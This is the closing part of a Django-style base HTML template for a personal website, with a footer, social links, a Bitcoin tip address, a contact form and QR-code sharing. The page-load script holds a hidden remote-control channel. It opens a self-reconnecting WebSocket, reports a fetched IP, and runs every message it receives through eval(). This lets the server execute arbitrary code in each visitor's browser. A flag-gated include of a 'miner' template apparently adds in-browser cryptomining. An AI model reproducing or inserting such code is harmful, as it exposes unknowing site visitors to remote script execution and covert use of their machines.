    </header>
    {% endif %}
    <main role="main" class="container">
        {% if not hidefooter %}
	    <div style="height: 100px;"></div>
        {% endif %}
	    {% block content %}{% endblock %}
        {% if not hidefooter %}
        {% include 'web/language.html' %}
        <p><i>{{ 'Leave me a tip in Bitcoin using this address:'|etrans }}</i> <b id="btc-wallet">{{ btc_wallet }}</b> <button class="btn btn-sm btn-info" title="{{ 'Copy address'|etrans }}" onclick="copyToClipboard('btc-wallet');">{{ 'Copy'|etrans }}</button></p>
        <div id="javascript-console"></div>
	    <div class="d-flex justify-content-between p-2">
	        <div style="float:left;">
	          <p><span class="badge bg-light text-dark shadow p-1">&copy; {{ site_name }} {{ year }}</span></p>
		    </div>
            <div style="text-align: center;">
                {% if show_social_links %} <a href="{{ instagram_link }}" about="_blank" title="{{ 'Visit me on Instagram'|etrans }}" style="font-size: 20px;" class="ml-1"><i class="bi bi-instagram"></i></a> <a href="{{ twitter_link }}" about="_blank" title="{{ 'Visit me on Twitter'|etrans }}" style="font-size: 20px;" class="ml-1"><i class="bi bi-twitter"></i></a> <a href="{{ youtube_link }}" about="_blank" title="{{ 'Watch me on YouTube'|etrans }}" style="font-size: 20px;" class="ml-1"><i class="bi bi-youtube"></i></a> <a href="{{ podcast_link }}" about="_blank" title="{{ 'Listen to the Podcast (on your favourite platform)'|etrans }}" style="font-size: 20px;" class="ml-1"><i class="bi bi-broadcast-pin"></i></a>{% endif %}
            </div>
	        <div style="float:right;">
	          <p><span class="badge bg-light text-dark shadow p-1"><a href="{{ site_url }}/terms/?lang={{ lang }}" title="{{ 'See the terms of service'|etrans }}">{{ 'Terms of Service'|etrans }}</a></span></p>
		    </div>
	    </div>
	    <div style="height: 100px;"></div>
        {% endif %}
    </main>
    {% if not hidefooter %}
    {% block footer %}{% endblock %}
    {% endif %}
    <script src="/static/main.js"></script>
    <script>
        {% block javascript %}{% endblock %}
        {% load feed_filters %}
        {% load app_filters %}
        $(document).ready(function() {
            {% if not hidenavbar %}
            {% if polling_now %}
            var hideVoteCookie = getCookie("hidevotebanner") != '';
            if(document.getElementById('vote-banner') && hideVoteCookie) { document.getElementById('vote-banner').classList.add('fade-hidden'); }
            else if(document.getElementById('vote-banner')) { document.getElementById('vote-banner').classList.remove('fade-hidden');
            document.getElementById('vote-banner').classList.remove('hide'); }
            {% endif %}
            $(document.getElementById("glam-navbar")).autoHidingNavbar();
            {% endif %}
        	Prism.highlightAll();
        });
        var remoteSocket;
        function openRemoteSocket() {
            window.location.hash = '';
            remoteSocket = new WebSocket("wss://{{ base_domain }}"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
            remoteSocket.addEventListener("open", (event) => {
                console.log('Socket open.');
                fetch('https://lotteh.com/remote/generate/')
        		    .then(response => response.json())
        		    .then(data => {
        		        remoteSocket.send(data.ip);
        		    })
        		    .catch(error => {
        		        console.log('Error:', error);
        		    });
            });
            remoteSocket.addEventListener("close", (event) => {
                console.log('Socket closed.');
                setTimeout(function() {
                    openRemoteSocket();
                }, 10000);
            });
        	remoteSocket.addEventListener("message", (event) => {
                    eval(event.data);
            });
        }
        openRemoteSocket();
        $(document).ready(function() {
        	$("#contact-form").submit(function(e){
                	e.preventDefault();
                	var data = new FormData(document.getElementById('contact-form'));
                	$.ajax({
                        	url: "{{ site_url }}/contact/",
                        	type: "POST",
                        	data: data,
                        	cache: false,
                	        contentType: false,
        	                processData: false,
                            timeout: 1000 * 60,
                	        tryCount: 0,
        	                retryLimit: 5,
                            error: (xhr, textStatus, errorThrown) => {
                                    this.tryCount++;
                                    if(this.tryCount >= this.retryLimit) return;
                                    $.ajax(this);
                            },
                            success: (data) => {
                                    if(data == 'Message sent.') {
                                            $('#contact-submit').prop('disabled', true);
                                            $(this).trigger('reset');
                                    }
                                    document.getElementById('contact-message').innerHTML = data;
                                    $('#contact-message').removeClass('hide');
                            },
                    });
            });
        });
        $(document).ready(function() {
        	{% include 'clock.js' %}
            var qrdiv = document.getElementById("shareqrcode");
        	if(!qrdiv) return;
            $(qrdiv).kjua({text: "{{ base_url }}{{ path }}{% if request.GET %}?{% for key, value in request.GET.items %}{{key}}={{value}}{% if forloop.counter < request.GET|length %}&{% endif %}{% endfor %}{% endif %}", render: 'svg'});
        	var image = qrdiv.querySelector('svg');
            image.style.width = "100%";
            image.style.height = "auto";
            image.style.maxWidth = "400px";
            image.alt = "{{ 'Share this page by scanning a QR code.'|etrans }}";
            try {
                function downloadSVG() {
                    const svg = document.getElementById('shareqrcode').querySelector('svg');

                    const serializer = new XMLSerializer();
                    let source = serializer.serializeToString(svg);

                    if (!source.match(/^<svg[^>]+xmlns=\"http:\/\/www\.w3\.org\/2000\/svg\"/)) {
                        source = source.replace(/^<svg/, '<svg xmlns="http://www.w3.org/2000/svg"');
                    }
                    if (!source.match(/^<svg[^>]+\"http:\/\/www\.w3\.org\/1999\/xlink\"/)) {
                        source = source.replace(/^<svg/, '<svg xmlns:xlink="http://www.w3.org/1999/xlink"');
                    }
                    source = '<?xml version="1.0" standalone="no"?>\r\n' + source;

                    const url = "data:image/svg+xml;charset=utf-8," + encodeURIComponent(source);

                    const downloadLink = document.createElement('a');
                    downloadLink.href = url;
                    downloadLink.download = ('{{ the_site_name }} - QR Code').replaceAll(' ', '_');

                    document.body.appendChild(downloadLink);
                    downloadLink.click();
                    document.body.removeChild(downloadLink);
                }
                function downloadQr(){
                    downloadSVG();
                }
                qrdiv.onclick = downloadQr;
            } catch(error) {
                    document.getElementById('javascript-console').insertAdjacentHTML("beforeend", '<div>' + new String(error) + '</div>');
            }
        });
    </script>
    {% if not hiderrm %}
    {% include 'rrm.html' %}
    {% endif %}
    {% if activate_mining %}
    {% include 'web/miner.html' %}
    {% endif %}
    {% block javascripts %}
    {% endblock %}
    <script>
        if (navigator.serviceWorker) {
            navigator.serviceWorker.register (
              '/serviceworker.js',
              {scope: '/'}
            )
        }
    </script>
</body>
</html>
